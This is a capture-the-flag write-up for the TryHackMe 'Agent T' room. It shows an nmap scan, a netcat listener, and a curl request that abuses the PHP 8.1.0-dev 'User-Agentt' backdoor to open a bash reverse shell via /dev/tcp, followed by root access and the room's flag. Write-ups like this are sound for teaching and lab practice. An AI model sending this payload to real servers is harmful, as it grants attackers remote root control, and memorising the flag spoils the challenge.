| Category          | Details                                      |
|-------------------|----------------------------------------------|
| 📝 **Name**       | [Agent T](https://tryhackme.com/room/agentt) |  
| 🏷 **Type**       | THM Challenge                                |
| 🖥 **OS**         | Linux                                        |
| 🎯 **Difficulty** | Easy                                         |
| 📁 **Tags**       | PHP/8.1.0-dev backdoor                       |

## Task 1: Find The Flag

### What is the flag?

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Agent T]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-14 07:09 +0100
Nmap scan report for 10.80.174.138
Host is up (0.040s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title:  Admin Dashboard

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.30 seconds
```
`nmap` have detected `PHP/8.1.0-dev` which contains backdoor in `User-Agentt` HTTP header.

#### Start `nc` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM Agent T]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

#### Spawn reverse shell connection using backdoor in `User-Agentt` HTTP header
```
┌──(magicrc㉿perun)-[~/attack/THM Agent T]
└─$ curl http://$TARGET -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'\");"
```

#### Confirm foothold gained
```
connect to [192.168.131.53] from (UNKNOWN) [10.80.174.138] 39230
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3f8655e43931:/var/www/html# id
id
uid=0(root) gid=0(root) groups=0(root)
```

#### Capture the flag
```
root@3f8655e43931:/var/www/html# cat /flag.txt
cat /flag.txt
flag{4127d0530abf16d6d23973e3df8dbecb}
```
